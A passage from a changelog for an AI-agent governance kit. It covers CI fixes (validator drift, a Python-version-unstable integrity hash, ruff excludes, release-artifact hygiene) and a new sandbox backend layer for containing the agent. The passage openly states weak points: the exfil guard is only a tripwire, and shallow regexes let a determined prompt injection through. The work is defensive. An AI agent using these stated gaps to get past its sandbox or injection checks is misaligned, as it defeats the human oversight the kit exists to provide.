`substrate-config: unknown key: SUBSTRATE_SANDBOX` (exit 2) before any work ran.
The kit's OWN config predates the key, so local `manage.sh` never hit it — only
a fresh bootstrap does, which is exactly what the release-matrix exercises.

This is the substrate's own thesis turned on itself: a config key added to one
of two validators but not the other (the class `check_validator_input_coverage`
guards for *test* coverage, here for the *two config validators*).

Fix: `_substrate_config.sh` now mirrors `check_substrate_config.py` for
`SUBSTRATE_SANDBOX` — default, key allowlist, and `{0,1}` enum. New
`test_config_key_allowlists_agree` asserts every `_ALLOWED_KEYS` entry is also
accepted by the shell loader, so the two-validator drift class can't recur.
Verified through the real path: a fresh strict bootstrap's config now loads
clean through `manage.sh` (no unknown-key). 167 tests pass.

All three CI failure classes (doc-drift frozen-date staleness, strict CODEOWNERS
in a throwaway repo, two-validator config drift) are now fixed AND gated.

## v3.4.3 — CI green: the kit passes its OWN pre-commit (two more classes)

The kit's own `CI / checks` job (`manage.sh check` = the real pre-commit) failed
for the first time once it ran on GitHub. Two distinct classes, both fixed
structurally — and a process fix so a green local run now PROVES a green CI run.

| Failing hook | Root cause | Class-fix |
|---|---|---|
| `check-policy-code-integrity` BLOCK (`command_policy.py: module AST hash mismatch`) — yet the file was never touched | The pin normalized via `ast.unparse`, whose **formatting is not stable across CPython minor versions**. The pin was generated on the maintainer's 3.13; CI runs 3.11; identical source → different `ast.unparse` output → different hash → **false** "module changed". The "version-stable across 3.11+" claim was wrong. This would have FALSELY tripped for **every user on a Python ≠ the pin-gen version**. | Hash the **raw UTF-8 source bytes** instead (`MODULE_SOURCE_SHA256`): byte-identical on every interpreter (portable by construction), and *stricter* — a comment/whitespace-channel weakening can no longer slip past `ast.unparse`'s normalization. Cost (a comment edit now needs a reviewed re-pin) is the correct posture for these CODEOWNED files, and strict trusted-base already freezes all of `scripts/`. New `test_policy_code_integrity_blocks_comment_only_edit` locks the byte-exact contract; the drift-guard test asserts the old `ast.unparse` normalizer is gone. |
| `ruff-format` + `ruff-check` fail (E501×169, E702×116, E701×98, E401, I001 across 41 files, incl. the integrity-pinned files) | Ruff's style/format rules fundamentally conflict with the substrate's **deliberate compact, integrity-PINNED** code style. Worse: bootstrap ships `scripts/` + `tests/` into consuming repos, so the kit's *own* vendored code would fail a **user's** pre-commit on install. | Ruff's job in a substrate repo is to lint the **project's** code, not the vendored substrate (governed by its own chain: syntax/integrity/harness/hook smoke/pytest). `[tool.ruff] extend-exclude = ["scripts","extras","tests"]` in both `pyproject.toml` and the template — mirroring the pre-existing `mypy` `scripts/` exclude — and `--force-exclude` in `run_python_gate.sh` so the exclude binds even though pre-commit passes filenames explicitly. Fixes the kit's CI *and* the latent user-repo-install failure. |

Process fix (the "make sure these don't happen again" the user asked for): the
prior misses share one cause — local `package_release --full` runs validators
from a non-git extracted artifact and never executes the kit's *own* pre-commit,
so doc-drift git-dates, config drift, AST-version drift, and ruff never appeared
locally. v3.4.3 closes the gap by running the kit's actual `manage.sh setup &&
manage.sh check` (real pre-commit, real git state) locally as the release gate
before pushing — so a green local check now means a green CI check.

## v3.4.4 — release-artifact provenance + minimality (two P2s from the v3.4.3 audit)

The v3.4.3 audit confirmed no security/policy-core blocker and cleared the CI
classes; it raised two P2 artifact observations, both fixed here.

| P2 | Root cause | Fix |
|---|---|---|
| Review-bundle manifest said `verification_mode: smoke` while the release notes claimed full verification | `manage.sh release` (→ `release_gate.sh`) is a GATE that never packages; the dist artifacts were left behind by the `package_release.sh --smoke` call inside `test_package_release_excludes_local_venv_end_to_end`. Shipping `dist/*` therefore shipped a TEST's smoke bundle, not a full-verified one. | Ship discipline: the release artifact MUST be built by `package_release.sh --full` (it already defaults to `--full`; it runs the complete pytest suite FROM the artifact and stamps `verification_mode: full`). v3.4.4 is packaged that way and the shipped manifest is verified to read `full`. |
| `.substrate/memory/events.jsonl` (+ `.lock`) shipped as ~91KB of maintainer runtime state | The zip + source-hash exclusions covered `.substrate/memory/tasks/` but not the event log / lock. | Exclude the whole `.substrate/memory/` runtime dir from both the artifact (`zip -x`) and the source-tree hash (`find ! -path`), and add it to the zip-hygiene `_JUNK_RE` so a leak BLOCKS. Consuming repos get a fresh chain from bootstrap, so nothing of value is lost. Regression-tested (static + end-to-end listing check). |

Neither changes the risk model. The next substantive build remains the
**strict + sandbox** profile (the exfil guard is still a tripwire, not
containment) — see the sandbox spine (v3.4.0) and DESIGN.md.

## v3.5.0 — sandbox backend abstraction (compose, don't reinvent)

Two independent strategy reviews converged: own the differentiating substrate
(governance/memory/eval/release/cross-agent), and treat containment as an
*optional backend* — never the center, never a hard dependency, never Claude-only.
v3.5.0 turns the single hand-rolled OS sandbox into a **backend abstraction**.

- `scripts/sandbox_detect.py` — resolves the backend from `.substrate/sandbox.json`
  (DATA, validated **fail-closed**): `backend = auto | anthropic-srt | bubblewrap |
  seatbelt | none`. `auto` prefers **`@anthropic-ai/sandbox-runtime` (`srt`)** if its
  CLI is already present (whole-process: network deny+allowlist, filesystem
  write-scope, read-deny), else the OS-native primitive (Linux bubblewrap / macOS
  seatbelt, **network containment only**), else none. **Node is never forced** — srt
  is used only if already installed.
- **Honest capability reporting:** backends are NOT equal. The resolver + `go-live`
  report exactly what the chosen backend can do (srt=network+fs+allowlist;
  bwrap/seatbelt=network-only) and **warn** when the policy asks for more than the
  backend delivers (e.g. `network=allowlist` on seatbelt) — no overclaiming.
- `scripts/sandbox_exec.sh` now dispatches through the resolver: srt path generates
  an `srt-settings.json` (translated from `sandbox.json`) and runs `srt --settings …`;
  bwrap/seatbelt paths unchanged; **none → exit 3 (fail-closed)**. Containment proof
  unchanged (socket op → `EPERM` vs baseline connect).
- **Orthogonal flag, not a profile-matrix:** `--profile strict+sandbox` is a bootstrap
  **alias** = `profile=strict` + `SUBSTRATE_SANDBOX=1`; the config enum stays
  `{starter,standard,strict}`. Sandbox (and, later, security scanners) are orthogonal
  to governance level, so they are flags + `.substrate/sandbox.json`, not combinatorial
  profiles. Bootstrap writes a default `sandbox.json` (discoverable + editable).
- `substrate_doctor --go-live` sandbox row now reports `backend=<id> (<capabilities>)`.
- Tests: backend resolution, **fail-closed** on invalid `sandbox.json`, capability
  honesty (warns when a backend can't allowlist/scope), srt-settings translation, and
  the alias-is-a-flag invariant. Existing v3.4.0 containment + config tests still pass.

Deferred to v3.5.1+: the containment **eval-harness task** + `evals --report`/`BENCHMARK.md`
(self-published reproducible proof); auto-wiring the agent's Bash through the sandbox;
fine-grained fs write-scope on the bwrap/seatbelt backends.

## Deferred (P2 — documented, not yet built)

These are real improvements the review identified; scoped as future
work rather than shipped half-done:

- **Event-sourced memory.** _Built in v3.2/v3.2.1:_ append-only
  hash-chained `.substrate/memory/events.jsonl` with file locking and a
  git-note anchor (`verify --anchor` catches full rewrites).
  CURRENT_SESSION.md is now a derived view. Remaining: pushing the
  anchor note to a protected remote and a structured task namespace.
- **Trace/eval harness.** No `evals/` with golden tasks, graders, and
  adversarial prompt-injection cases yet. The kit has static gates and
  now an injection regression test, but not task-level reliability
  metrics. Pair with OpenAI Agents SDK tracing / LangGraph / Temporal
  for durable runtime execution and measured eval loops.
- **Positioning.** This is a repo-local agent-governance substrate,
  not a durable execution runtime. Use it for gates, skills, memory
  summaries, and self-audit; pair it with a runtime for long-horizon
  multi-step durability.

## Known limitations carried forward

- `check_agent_harness.py` regexes are shallow — a determined injection
  passes them; the harness-audit skill's manual pass is the real
  defense.
- Date-bump-without-reading on knowledge docs remains honor-system —
  no mechanical defense exists.
- Hook reliability: PreCompact has open upstream bug reports about not
  firing in some configs; `manage.sh handoff` is the manual fallback.
- CI template still assumes uv/python for the substrate's own
  validators (they are stdlib-or-PyYAML python scripts even in node/go
  repos; python3 must be on PATH).
